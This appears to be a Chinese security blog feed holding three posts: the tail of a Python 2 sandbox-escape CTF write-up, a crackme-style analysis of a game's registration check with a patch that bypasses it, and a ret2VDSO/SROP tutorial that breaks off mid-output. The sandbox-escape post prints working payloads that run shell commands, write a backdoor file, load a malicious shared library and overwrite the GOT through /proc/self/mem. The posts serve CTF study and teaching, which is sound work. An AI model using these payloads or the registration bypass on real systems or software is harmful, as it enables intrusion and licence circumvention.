<code>file</code>）：</p><pre><code class="python">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()1..__class__.__bases__[0].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()</code></pre><p>其他的一些执行命令的方法（通过获取其他已经载入了 os 等模块的类进行调用）：</p><pre><code class="python"># 执行系统命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.system(&#39;ls&#39;)().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)# 重新载入__builtin__().__class__.__bases__[0].__subclasses__()[59]()._module.__builtin__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# 读文件().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()# 写文件().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/bkdoor&#39;, &#39;w&#39;).write(&#39;123&#39;)# 执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#39;)</code></pre><p>可以编写一个函数对导入了 <code>os</code> 或 <code>sys</code> 的库进行一个遍历：</p><pre><code class="python">#!/usr/bin/env pythonall_modules = [    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;sre_parse&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;]methods = [&#39;os&#39;, &#39;sys&#39;, &#39;__builtin__&#39;]results = {}for module in all_modules:    results[module] = {        &#39;flag&#39;: 0,        &#39;result&#39;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                results[module][&#39;flag&#39;] = 1                results[module][&#39;result&#39;][method] = &#39;\033[1;31mYES\033[0m&#39;            else:                results[module][&#39;result&#39;][method] = &#39;NO&#39;    except Exception as e:        print module, efor result in results:    if results[result][&#39;flag&#39;]:        print &#39;[*]&#39;, result        for r in results[result][&#39;result&#39;]:            print &#39;\t[+]&#39;, r, &#39;=&gt;&#39;, results[result][&#39;result&#39;][r]</code></pre><h1 id="伪-private-属性和函数"><a href="#伪-private-属性和函数" class="headerlink" title="伪 private 属性和函数"></a>伪 <code>private</code> 属性和函数</h1><p>Python 中以双下划线开头的函数和属性是 <code>private</code> 的，但是这种 <code>private</code> 只是形式上的，表示这个函数不应该在本类之外的地方进行访问，而是否遵守则取决于具体的实现。公有的函数和属性，使用其名字直接进行访问；而私有的属性和函数，使用 <code>下划线+类名+函数名</code> 进行访问：</p><pre><code class="python">In [1]: class A():    ...:     __a = 1    ...:     b = 2    ...:     def __c(self):    ...:         pass    ...:     def d(self):    ...:         pass    ...:In [2]: dir(A)Out[2]: [&#39;_A__a&#39;, &#39;_A__c&#39;, &#39;__doc__&#39;, &#39;__module__&#39;, &#39;b&#39;, &#39;d&#39;]</code></pre><h1 id="构造-so-库"><a href="#构造-so-库" class="headerlink" title="构造 so 库"></a>构造 so 库</h1><p>编译一个 so 库，并写入指定的路径：</p><pre><code class="cpp">// gcc bkdoor.c -shared -fPIC -o libbkdoor.sovoid my_init() __attribute__((constructor));void my_init() {    system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);}</code></pre><p>调用 ctypes 来载入 so 库：</p><pre><code class="python">In [1]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[235] =&gt; ctypes.CDLLIn [2]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236] =&gt; ctypes.LibraryLoaderIn [3]: &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236](&#39;&#39;.__class__.__mro__[-1].__subclasses__()[235]).LoadLibrary(&#39;/tmp/libbkdoor.so&#39;)Out[3]: &lt;CDLL &#39;/tmp/libbkdoor.so&#39;, handle 2831310 at 7ff2434184d0&gt;In [4]: __import__(&#39;os&#39;).system(&#39;cat /tmp/ls_home_ctf&#39;)total 8drwxr-xr-x 2 root root 4096 Apr  3 02:23 .drwxr-xr-x 1 root root 4096 Apr  3 02:23 ..-rw-r--r-- 1 root root    0 Apr  3 02:23 flagOut[4]: 0</code></pre><h1 id="修改-GOT-表"><a href="#修改-GOT-表" class="headerlink" title="修改 GOT 表"></a>修改 GOT 表</h1><p>类似 PWN 里的做法，可以把 <code>fopen</code> 的 GOT 改为 <code>system</code>。先用 objdump 查找：</p><pre><code class="bash">/usr/bin ❯ objdump -R python | grep -E &quot;fopen|system&quot;00000000008de2b8 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.500000000008de8c8 R_X86_64_JUMP_SLOT  fopen64@GLIBC_2.2.5</code></pre><p>一句话脚本：</p><pre><code class="python"># 0x00000000008de2b8 =&gt; system# 0x00000000008de8c8 =&gt; fopen(lambda r, w:    r.seek(0x00000000008de2b8) or    w.seek(0x00000000008de8c8) or    w.write(r.read(8)) or    ().__class__.__bases__[0].__subclasses__()[40](&#39;ls&#39;))(    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;r&#39;),    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;w&#39;, 0))</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SameBall.exe v1.02 注册码算法浅析</title>
    <link href="blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    <id>blog.b3ale.cn/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/</id>
    <published>2020-03-19T05:44:56.000Z</published>
    <updated>2020-03-20T08:00:50.354Z</updated>
    
    <content type="html"><![CDATA[<p>老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>程序是一个对对碰游戏，每过一段时间，程序会检测注册表中是否有注册信息，如果没有会弹出注册窗口。</p><h1 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h1><p>先看看注册向导中会提供什么有用的信息：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/2.png" srcset="/img/loading.gif" alt></p><p>通过字符串搜索，定位到关键的几处代码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/3.png" srcset="/img/loading.gif" alt></p><p>然后单步走出这个函数，在 004063CA 处，对前面函数的结构做了一个判断，并跳有一个跳转，往下的代码，可以看出是在使用 RegSetValueA 往注册表里写东西，说明判断注册码成功后进行注册。那么只需要把这个跳转 nop 掉，或者是改成强制的 JMP 004063D0（即跳到下一条指令）即可：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/5.png" srcset="/img/loading.gif" alt></p><p>将修改保存到文件之后随便输入什么内容都能注册了。</p><h1 id="Algorithm-Analysis"><a href="#Algorithm-Analysis" class="headerlink" title="Algorithm Analysis"></a>Algorithm Analysis</h1><p>先尝试随机输入一些数据，然后根据前面的分析，可以发现在 004063B2 处进行了判断，前面的函数应该生成了注册码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/6.png" srcset="/img/loading.gif" alt></p><p>进入 00406780 函数，通过函数将两个长为 32 的字符串转为了整型，整型的字长被记录在最低字上：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/7.png" srcset="/img/loading.gif" alt></p><p>接着在在 0040686C 处发现两个字符串以及我们输入的字符串被作为参数传入：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/8.png" srcset="/img/loading.gif" alt></p><p>进入 00406570 函数之后，在 004065C0 处先对字符串的长度判断是否小于 0x100，接着判断字符串的长度是否大于零：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/9.png" srcset="/img/loading.gif" alt></p><p>然后对字符串每个字符进行判断是否在 0 ～ F 的范围内，即是否是一个十六进制字符串：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/10.png" srcset="/img/loading.gif" alt></p><p>显然如果不是的话就会出错，所以在这里设下断点，重新输入一个十六进制数 1234 作为注册码。接着继续往下，在 0040663A 处将我们的输入字符串转成了整型：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/11.png" srcset="/img/loading.gif" alt></p><p>接着往下跟进 00401AE0 函数，其中也传入了三个数字。在 00401B39 到 00401B48 处，计算 8231FC324594496514663D91E6C19989 共有多少位：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/12.png" srcset="/img/loading.gif" alt></p><p>接着将得到的位数 0x80 减去 2，开始进入下面的一个大循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/13.png" srcset="/img/loading.gif" alt></p><p>接着在循环中多次调用了 00410630 函数，其中将我们的输入自己相乘，并将结果返回：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/14.png" srcset="/img/loading.gif" alt></p><p>然后调用了 00410A40 函数，具体的汇编个人觉得是被编译器优化过后的结果，通过推测判断可以发现这个函数的运行结果为之前的乘积模 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/15.png" srcset="/img/loading.gif" alt></p><p>接着在后面取出了 8231FC324594496514663D91E6C19989，去最高的字并右移 0x1E 位，判断最低位是否为 1，如果为 1 进行下面的一堆乘法操作；反之跳过这段内容。看到这段内容，回想起以前做 ACM 的时候接触过的快速幂算法，按比特判断是否加上对应的次方：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/16.png" srcset="/img/loading.gif" alt></p><p>如果为 0，跳转到最下面，将迭代的数字减一，并开始下一个循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/17.png" srcset="/img/loading.gif" alt></p><p>在接下来的循环中，如果判断相乘的数大于一个字，就会分成几个字分别和目标相乘，依次由最高字开始，每次将乘积左移 32 位后加上下一次的乘积：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/18.png" srcset="/img/loading.gif" alt></p><p>这样下来基本清楚 00401AE0 函数是将我们的输入乘上 8231FC324594496514663D91E6C19989 次方再模去 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果，推测应该是 RSA 了。后面有一些乱七八糟的函数，调试了很多遍后没发现有什么作用。最后下断点在 00401E34 这里，最后 EAX 存储的地址即为指向 0x1234 经过上面操作的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/19.png" srcset="/img/loading.gif" alt></p><p>然后在 00406570 函数的最后面 0040675F 这边停下来，发现最后将结果转成了字符串，并在 EAX 里存储了这个字符串的地址：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/20.png" srcset="/img/loading.gif" alt></p><p>最后调试的时候是将结果和 0 进行比较，这样的话注册码写 0 就行了，0 的几次方结果都是 0。测试了一下注册码写 0 的话是可以写入注册表的，但是感觉不太可能这么简单，不过前面的 RSA 算法分析应该是没有什么问题了：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/21.png" srcset="/img/loading.gif" alt></p><p>整体看下来发现动态调试确实相比静态分析能更加深入地熟悉一个程序，连续分析了两天，是一次痛苦但收获颇多的经历。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.pediy.com/thread-38901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-38901.htm</a><br><a href="https://oi-wiki.org/math/quick-pow/" target="_blank" rel="noopener">https://oi-wiki.org/math/quick-pow/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <id>blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/</id>
    <published>2020-03-14T02:24:24.000Z</published>
    <updated>2020-03-19T15:51:15.263Z</updated>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><pre><code class="bash">$ ldd /bin/sh    linux-vdso.so.1 =&gt;  (0x00007ffda1746000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)    /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</code></pre><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xffffffffff600000   0xffffffffff600000:    mov    rax,0x60   0xffffffffff600007:    syscall   0xffffffffff600009:    ret</code></pre><p>可以写一个程序做一个系统调用的测试：</p><pre><code class="cpp">#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) {    time_t tloc;    int retval = 0;    time_func func = (time_func) 0xffffffffff600000;    retval = func(&amp;tloc);    if (retval &lt; 0) {        perror(&quot;time_func&quot;);        return -1;    }    printf(&quot;%ld\n&quot;, tloc);    return 0;}</code></pre><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><pre><code class="asm">push ebp ; mov ebp, esp</code></pre><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><pre><code class="gdb">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</code></pre><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><pre><code class="gdb">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000</code></pre><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv32   AT_SYSINFO           Special system info/entry points 0xf7fd8b5033   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x80480344    AT_PHENT             Size of program header entry   325    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0xf7fd90008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x804834011   AT_UID               Real user ID                   012   AT_EUID              Effective user ID              013   AT_GID               Real group ID                  014   AT_EGID              Effective group ID             023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0xffffd8cb31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;0    AT_NULL              End of vector                  0x0</code></pre><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><pre><code class="bash">$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    ...</code></pre><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = &quot;/bin/sh\x00&quot;;void pwnme() {    char s[0x100];    char *welcome = &quot;&gt; &quot;;    write(1, welcome, 2);    read(0, s, 0x400);}int main() {    pwnme();    return 0;}</code></pre><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xf7fd8b71   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:    mov    eax,0x77   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:    int    0x80   0xf7fd8b78 